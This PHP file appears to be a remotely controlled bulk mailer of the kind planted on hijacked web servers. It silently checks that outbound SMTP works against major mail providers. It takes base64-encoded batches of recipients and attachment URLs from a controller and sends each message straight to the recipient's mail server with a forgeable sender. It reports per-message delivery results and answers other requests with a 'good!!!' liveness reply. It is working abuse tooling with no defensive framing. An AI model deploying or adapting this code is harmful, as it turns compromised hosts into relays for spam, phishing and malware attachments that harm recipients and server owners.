<?php
    error_reporting(0);

    $_smtp_errors = "421,422,431,432,441,442,446,447,449,450,451,452,471,500,501,502,503,504,510,511,512,513,523,530,541,550,551,552,553,554";

    if ($_REQUEST['check'] == '1') {
	$mxs = array(
		    'gmail-smtp-in.l.google.com,google',
		    'mx.yandex.ru,yandex',
		    'mxs.mail.ru,mail',
		    'imx1.rambler.ru,rambler',
		    'mta5.am0.yahoodns.net,yahoo',
		    'mx1.hotmail.com,hotmail',
		    'mx.qip.ru,pochta'
		);

	foreach($mxs as $mx) {
	    $arr = explode(',', $mx);
	    $smtp = fsockopen($arr[0], 25, $errno, $errstr, 1);
	    stream_set_timeout($smtp, 1);
	    fwrite($smtp, "HELO ".$arr[0]."\r\n");
	    $read = fgets($smtp).'<br>';

	    if (stristr($read, '220') && stristr($read, $arr[1])) {
		$out[] = 'OK';
	    } else {
		$out[] = 'NO';
	    }
	}

	if (in_array('OK', $out) && !stristr(php_uname('s'), 'win')) {
	    echo 'OK';
	} else {
	    echo 'NO';
	}
	die();
    }

    if ($_REQUEST['data']) {
	session_start();

	$data = json_decode(base64_decode(str_replace(' ', '+', $_REQUEST['data'])), true);

	$mh = curl_multi_init();

	foreach($data['attach'] as $attach) {
	    $curl = curl_init();
	    curl_setopt($curl, CURLOPT_URL, $attach['url']);
	    curl_setopt($curl, CURLOPT_HEADER, 0);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
	    $file = curl_exec($curl);
	    curl_close($curl);

	    if ($file) {
		$_SESSION['attach'][] = array(
		    'mime' => $attach['mime'],
		    'name' => $attach['name'],
		    'file' => base64_encode($file)
		);
	    }
	}

	foreach($data as $email) {
	    if ($email['to']) {

		$email['session_id'] = session_id();

		if ($data['attach']) {
		    $email['attach'] = $data['attach'];
		}
		
		$ch[$email['id']] = curl_init();
		curl_setopt($ch[$email['id']], CURLOPT_URL, 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
		curl_setopt($ch[$email['id']], CURLOPT_HEADER, 0);
		curl_setopt($ch[$email['id']], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$email['id']], CURLOPT_POST, 1);
		curl_setopt($ch[$email['id']], CURLOPT_POSTFIELDS, 'send='.base64_encode(json_encode_($email)));
		curl_multi_add_handle($mh, $ch[$email['id']]);
	    }
	}

	session_write_close();

	do {
	    curl_multi_exec($mh, $still_running);
	    curl_multi_select($mh);
	} while($still_running > 0);

	$report = array();
	foreach($data as $email) {
//	    var_dump(curl_multi_getcontent($ch[$email['id']]));

	    if ($email['to']) {
	        $report[$email['id']]['id'] = $email['id'];
		$report[$email['id']]['result'] = 'NO';

		if (!curl_error($email['id'])) {
		    $result = curl_multi_getcontent($ch[$email['id']]);
		    if ($result == 'ok') {
			$report[$email['id']]['result'] = 'OK';
			$report[$email['id']]['errors'] = '';

		    } else {

			if ($result == 'mx' || $result == 'attach') {
			    $report[$email['id']]['errors'] = $result;
			} else {
			    $errors = '';
			    foreach(explode(',', $_smtp_errors) as $err) {
				if(preg_match('/'.$err.'/', $result)) {
				    $errors[] = $err;
				}
			    }

			    if ($errors) {
				$report[$email['id']]['errors'] = implode(",", $errors);
			    } else {
				$report[$email['id']]['errors'] = "curl-0";
			    }
			}
		    }
		} else {
		    $report[$email['id']]['errors'] = "curl-".curl_errno($ch[$email['id']]);
		}

		$report[$email['id']]['time'] = round(curl_getinfo($ch[$email['id']], CURLINFO_TOTAL_TIME));
	    }
	}

	echo base64_encode(json_encode($report));
	curl_multi_close($mh);
	die();
    }

    if ($_REQUEST['send']) {
	$data = json_decode(base64_decode(str_replace(' ', '+', $_REQUEST['send'])), true);
	if ($data['to']) {
	    session_id($data['session_id']);
	    session_start();

	    $data = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $data);

	    $domain = explode('@', $data['to']);
	    $domain = dns_get_record($domain[1], DNS_MX);
	    $email['mx'] = $domain[0]['target'];

	    if (!$email['mx']) {
		die("mx");
	    }

	    $sender = explode('@', $data['from']);
	    $domain = $sender[1];
	    $sender = $sender[0];

	    $recipient = explode('@', $data['to']);
	    $recipient = $recipient[0];

	    $boundary = '--' . md5(uniqid(time()));

	    $email['header'] = 'From: =?utf-8?B?'. base64_encode($data['name']).'?= <'.$data['from'].'>';
	    $email['header'] .= PHP_EOL.'To: '.$data['to'];
	    $email['header'] .= PHP_EOL.'Subject: =?utf-8?B?'.base64_encode($data['subj']).'?=';
	    $email['header'] .= PHP_EOL.'Message-ID: '.md5($sender . $recipient).'@'.$domain;
	    $email['header'] .= PHP_EOL.'MIME-Version: 1.0';

	    $email['text'] = $data['text'];

	    if ($data['attach']) {
		$email['header'] .= PHP_EOL.'Content-Type: multipart/mixed; boundary="'.$boundary.'"';
	    } else {
		$email['header'] .= PHP_EOL.'Content-Type: '.$data['type'].'; charset=UTF-8;';
	    }

	    if ($data['attach']) {
		$email['text'] = '--'.$boundary;
		$email['text'] .= PHP_EOL.'Content-Type: '.$data['type'].'; charset=UTF-8;';
		$email['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
		$email['text'] .= PHP_EOL.chunk_split(base64_encode($data['text']));
	    }


	    foreach($_SESSION['attach'] as $attach) {
		if ($attach['file']) {
		    $email['text'] .= PHP_EOL.'--'.$boundary;
		    $email['text'] .= PHP_EOL.'Content-Type: '.$attach['mime'].'; name = "'.$attach['name'].'"';
		    $email['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
		    $email['text'] .= PHP_EOL.chunk_split($attach['file']);
		    $file = $attach['file'];
		}
	    }

	    if ($data['attach'] && !$file) {
		    die("attach");
	    }

	    $smtp = fsockopen($email['mx'], 25, $errno, $errstr, 1);
	    stream_set_timeout($smtp, 1);

	    fwrite($smtp, 'HELO '.$email['mx']."\r\n");
	    $reply[] = 'HELO '.$email['mx']."\r\n";
	    $reply[] = fgets($smtp);

	    fwrite($smtp, 'MAIL FROM:<'.$data['from'].'>'."\r\n");
	    $reply[] = 'MAIL FROM:<'.$data['from'].'>'."\r\n";
	    $reply[] = fgets($smtp);

	    fwrite($smtp, 'RCPT TO:<'.$data['to'].'>'."\r\n");
	    $reply[] = 'RCPT TO:<'.$data['to'].'>'."\r\n";
	    $reply[] = fgets($smtp);

	    fwrite($smtp, 'DATA' . "\r\n");
	    $reply[] = 'DATA' . "\r\n";
	    $reply[] = fgets($smtp);

	    $headers = '';
	    foreach (explode("\n", $email['header']) as $val) {
		$headers .= $val."\r\n";
	    }

	    fwrite($smtp, $headers."\r\n");
	    $reply[] = $headers."\r\n\r\n";
	    $reply[] = fgets($smtp);

	    fwrite($smtp, $email['text']."\r\n");
	    $reply[] = $email['text']."\r\n";
	    $reply[] = fgets($smtp);

	    fwrite($smtp, "\r\n".'.'."\r\n");
	    $reply[] = "\r\n".'.'."\r\n";
	    $reply[] = $reply[] = fgets($smtp);

	    fwrite($smtp, 'QUIT'."\r\n");
	    $reply[] = 'QUIT'."\r\n";
	    $reply[] = fgets($smtp);

	    fclose($smtp);

//	    var_dump($reply);

	    foreach(explode(',', $_smtp_errors) as $err) {
		if(preg_grep('/^'.$err.'/i', $reply)) {
		    $errors[] = $err;
		}
	    }

	    if($errno || $errors) {
		echo implode(",", $errors);
	    } else {
		echo "ok";
	    }
	}
	die();
    }

    if (!$_REQUEST['check'] || !$_REQUEST['data'] || !$_REQUEST['send']) {
	echo "good!!!";
	die();
    }

    function json_encode_($string) {
	$arrayUtf = array('\u0410', '\u0430', '\u0411', '\u0431', '\u0412', '\u0432', '\u0413', '\u0433', '\u0414', '\u0434', '\u0415', '\u0435', '\u0401', '\u0451', '\u0416', '\u0436', '\u0417', '\u0437', '\u0418', '\u0438', '\u0419', '\u0439', '\u041a', '\u043a', '\u041b', '\u043b', '\u041c', '\u043c', '\u041d', '\u043d', '\u041e', '\u043e', '\u041f', '\u043f', '\u0420', '\u0440', '\u0421', '\u0441', '\u0422', '\u0442', '\u0423', '\u0443', '\u0424', '\u0444', '\u0425', '\u0445', '\u0426', '\u0446', '\u0427', '\u0447', '\u0428', '\u0448', '\u0429', '\u0449', '\u042a', '\u044a', '\u042b', '\u044b', '\u042c', '\u044c', '\u042d', '\u044d', '\u042e', '\u044e', '\u042f', '\u044f');
	$arrayCyr = array('А', 'а', 'Б', 'б', 'В', 'в', 'Г', 'г', 'Д', 'д', 'Е', 'е', 'Ё', 'ё', 'Ж', 'ж', 'З', 'з', 'И', 'и', 'Й', 'й', 'К', 'к', 'Л', 'л', 'М', 'м', 'Н', 'н', 'О', 'о', 'П', 'п', 'Р', 'р', 'С', 'с', 'Т', 'т', 'У', 'у', 'Ф', 'ф', 'Х', 'х', 'Ц', 'ц', 'Ч', 'ч', 'Ш', 'ш',  'Щ', 'щ', 'Ъ', 'ъ', 'Ы', 'ы', 'Ь', 'ь', 'Э', 'э', 'Ю', 'ю', 'Я', 'я');
	return str_replace($arrayUtf,$arrayCyr,json_encode($string));
    }
?>
